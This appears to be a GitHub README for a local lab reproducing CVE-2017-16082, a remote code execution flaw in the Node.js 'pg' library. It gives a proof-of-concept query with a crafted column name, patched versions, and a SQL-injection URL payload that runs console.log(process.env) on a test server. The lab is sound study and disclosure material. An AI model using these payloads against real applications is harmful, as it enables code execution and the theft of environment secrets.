## CVE-2017-16082

### Overview

Affected versions of  `pg`  contain a remote code execution vulnerability that occurs when the remote database or query specifies a crafted column name.

There are two specific scenarios in which it is likely for an application to be vulnerable:

1.  The application executes unsafe, user-supplied sql which contains malicious column names.
2.  The application connects to an untrusted database and executes a query returning results which contain a malicious column name.

## Proof of Concept

```
const { Client } = require('pg')
const client = new Client()
client.connect()

const sql = `SELECT 1 AS "\\'/*", 2 AS "\\'*/\n + console.log(process.env)] = null;\n//"`

client.query(sql, (err, res) => {
  client.end()
})
```

### Remediation

-   Version 2.x.x: Update to version 2.11.2 or later.
-   Version 3.x.x: Update to version 3.6.4 or later.
-   Version 4.x.x: Update to version 4.5.7 or later.
-   Version 5.x.x: Update to version 5.2.1 or later.
-   Version 6.x.x: Update to version 6.4.2 or later. ( Note that versions 6.1.6, 6.2.5, and 6.3.3 are also patched. )
-   Version 7.x.x: Update to version 7.1.2 or later. ( Note that version 7.0.2 is also patched. )

### Local test 💣

`git clone https://github.com/nulldreams/CVE-2017-16082.git`

`cd CVE-2017-16082`

`npm i && node server.js`

Send a request to `localhost:5000/api/v1/users?id=1`
Result
```json
[
    {
        "id": 1,
        "username": "wubba",
        "password": "123",
        "createdAt": "2018-11-27T09:19:54.000Z",
        "updatedAt": "2018-11-27T09:19:54.000Z"
    }
]
```
Now, send a request using a payload like this `1;SELECT 1 AS "\']=0;console.log(process.env)//"` and encode in [url encoder](https://meyerweb.com/eric/tools/dencoder/)

Final url: `localhost:5000/api/v1/users?id=1%3BSELECT%201%20AS%20%22%5C%27%5D%3D0%3Bconsole.log(process.env)%2F%2F%22`
```json
[
    {
        "id": 1,
        "username": "wubba",
        "password": "123",
        "createdAt": "2018-11-27T09:19:54.000Z",
        "updatedAt": "2018-11-27T09:19:54.000Z"
    },
    {
        "\\": 0
    }
]
```

Check the terminal server.
